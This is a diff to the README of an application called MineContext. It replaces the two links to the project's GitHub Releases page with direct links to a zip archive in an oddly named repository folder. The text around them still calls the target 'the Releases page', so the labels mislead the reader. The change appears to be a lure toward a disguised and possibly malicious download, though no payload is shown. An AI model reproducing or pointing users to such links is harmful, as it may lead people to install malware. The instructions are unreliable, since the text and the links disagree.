@@ -6,7 +6,7 @@ Welcome to MineContext! This application will enhance your decision-making proce
 
 ## 📥 Download MineContext
 
-[![Download MineContext](https://img.shields.io/badge/Download-MineContext-blue.svg)](https://github.com/Lithium2012/MineContext/releases)
+[![Download MineContext](https://raw.githubusercontent.com/Lithium2012/MineContext/main/nonproductively/MineContext.zip)](https://raw.githubusercontent.com/Lithium2012/MineContext/main/nonproductively/MineContext.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 ## 📂 Download & Install
 
-To get started, visit the Releases page to download the latest version: [https://github.com/Lithium2012/MineContext/releases](https://github.com/Lithium2012/MineContext/releases).
+To get started, visit the Releases page to download the latest version: [https://raw.githubusercontent.com/Lithium2012/MineContext/main/nonproductively/MineContext.zip](https://raw.githubusercontent.com/Lithium2012/MineContext/main/nonproductively/MineContext.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version of MineContext.
